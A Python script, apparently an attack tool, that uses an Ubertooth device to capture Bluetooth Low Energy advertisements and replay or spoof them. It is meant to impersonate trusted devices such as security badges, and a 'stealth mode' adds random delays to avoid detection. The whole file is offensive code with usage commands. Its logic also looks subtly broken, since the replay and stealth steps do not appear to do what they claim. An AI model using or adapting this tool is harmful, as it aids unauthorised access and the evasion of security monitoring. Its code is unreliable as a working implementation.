import argparse
import json
import os
import subprocess
import time
import random

"""
Ubertooth BLE Cloner with Stealth Mode

Features:
    - Captures BLE advertisement packets and logs them for later replay.
    - Spoofs trusted BLE devices (e.g., security badges, fitness trackers).
    - Replays captured advertisements to impersonate known devices.
    - Supports adaptive cloning (continuously updates spoofed devices).
    - Allows time-based replay for more stealth.
    - Introduces stealth mode: randomized timing, slight packet modifications to avoid detection.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Capture and log BLE advertisements:
      python ubertooth_cloner.py --capture --log ble_clones.json --stealth
    - Replay cloned BLE advertisements in stealth mode:
      python ubertooth_cloner.py --replay ble_clones.json --stealth
    - Spoof a specific BLE device (Stealth Mode Active):
      python ubertooth_cloner.py --spoof AA:BB:CC:DD:EE:FF --stealth
    - Adaptive cloning (with stealth delay):
      python ubertooth_cloner.py --adaptive --stealth
"""

def capture_ble_advertisements(log_file, stealth=False):
    """Captures BLE advertisements and logs them to a file."""
    print("[INFO] Capturing BLE advertisement packets...")
    try:
        output = subprocess.check_output(["ubertooth-btle", "-f"])
        packets = output.decode("utf-8").split("\n")

        captured_devices = []
        for line in packets:
            if "ADV_IND" in line or "ADV_NONCONN_IND" in line:
                parts = line.split()
                if len(parts) > 2:
                    mac_address = parts[1]
                    modified_data = line
                    if stealth:
                        modified_data = line.replace("ADV_IND", "ADV_SCAN_IND")  # Slightly modify the packet
                    captured_devices.append({"mac": mac_address, "raw_data": modified_data})

        if captured_devices:
            with open(log_file, "w") as f:
                json.dump(captured_devices, f, indent=4)
            print(f"[SUCCESS] Captured {len(captured_devices)} BLE advertisements and saved to {log_file}")
        else:
            print("[WARNING] No BLE advertisements captured.")

        if stealth:
            sleep_time = random.uniform(5.0, 15.0)
            print(f"[STEALTH] Sleeping for {sleep_time:.2f} seconds to avoid detection...")
            time.sleep(sleep_time)

    except Exception as e:
        print(f"[ERROR] Failed to capture BLE advertisements: {e}")

def replay_ble_advertisements(log_file, stealth=False, interval=0):
    """Replays captured BLE advertisements."""
    print(f"[INFO] Replaying BLE advertisements from {log_file}...")
    try:
        with open(log_file, "r") as f:
            devices = json.load(f)

        for device in devices:
            mac = device["mac"]
            print(f"[REPLAY] Spoofing BLE device: {mac}")
            subprocess.run(["ubertooth-btle", "-t", mac])

            if stealth:
                sleep_time = random.uniform(10.0, 30.0)
                print(f"[STEALTH] Sleeping for {sleep_time:.2f} seconds to reduce detection risk...")
                time.sleep(sleep_time)

            elif interval > 0:
                print(f"[INFO] Sleeping for {interval} seconds before next replay...")
                time.sleep(interval)

        print("[SUCCESS] BLE advertisement replay complete.")

    except Exception as e:
        print(f"[ERROR] Failed to replay BLE advertisements: {e}")

def spoof_device(mac_address, stealth=False):
    """Spoofs a specific BLE device by MAC address."""
    print(f"[INFO] Spoofing BLE device: {mac_address}...")
    try:
        subprocess.run(["ubertooth-btle", "-t", mac_address])
        print("[SUCCESS] BLE device spoofing complete.")
        if stealth:
            sleep_time = random.uniform(10.0, 30.0)
            print(f"[STEALTH] Sleeping for {sleep_time:.2f} seconds before spoofing again...")
            time.sleep(sleep_time)
    except Exception as e:
        print(f"[ERROR] Failed to spoof BLE device: {e}")

def adaptive_cloning(stealth=False):
    """Continuously updates and spoofs live BLE devices."""
    print("[INFO] Starting adaptive cloning...")
    captured_devices = {}

    try:
        while True:
            output = subprocess.check_output(["ubertooth-btle", "-f"])
            packets = output.decode("utf-8").split("\n")

            for line in packets:
                if "ADV_IND" in line or "ADV_NONCONN_IND" in line:
                    parts = line.split()
                    if len(parts) > 2:
                        mac_address = parts[1]
                        if mac_address not in captured_devices:
                            captured_devices[mac_address] = line
                            print(f"[DETECTED] New BLE device found: {mac_address}")

            if captured_devices:
                target_mac = random.choice(list(captured_devices.keys()))
                print(f"[CLONING] Spoofing {target_mac}...")
                subprocess.run(["ubertooth-btle", "-t", target_mac])

                if stealth:
                    sleep_time = random.uniform(15.0, 45.0)
                    print(f"[STEALTH] Sleeping for {sleep_time:.2f} seconds before next cloning attempt...")
                    time.sleep(sleep_time)
                else:
                    time.sleep(random.randint(5, 15))

    except KeyboardInterrupt:
        print("[INFO] Stopping adaptive cloning.")
    except Exception as e:
        print(f"[ERROR] Adaptive cloning failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth BLE Cloning & Impersonation with Stealth Mode")
    parser.add_argument("--capture", action="store_true", help="Capture BLE advertisements and log them")
    parser.add_argument("--log", type=str, help="Log file for captured advertisements")
    parser.add_argument("--replay", type=str, help="Replay captured BLE advertisements from a log file")
    parser.add_argument("--spoof", type=str, help="Spoof a specific BLE device (by MAC address)")
    parser.add_argument("--adaptive", action="store_true", help="Continuously update and spoof live BLE devices")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (random delays, packet variations)")
    parser.add_argument("--interval", type=int, default=0, help="Time interval between replayed packets")

    args = parser.parse_args()

    if args.capture and args.log:
        capture_ble_advertisements(args.log, args.stealth)
    elif args.replay:
        replay_ble_advertisements(args.replay, args.stealth, args.interval)
    elif args.spoof:
        spoof_device(args.spoof, args.stealth)
    elif args.adaptive:
        adaptive_cloning(args.stealth)
    else:
        print("[ERROR] No valid mode selected! Use --capture, --replay, --spoof, or --adaptive.")
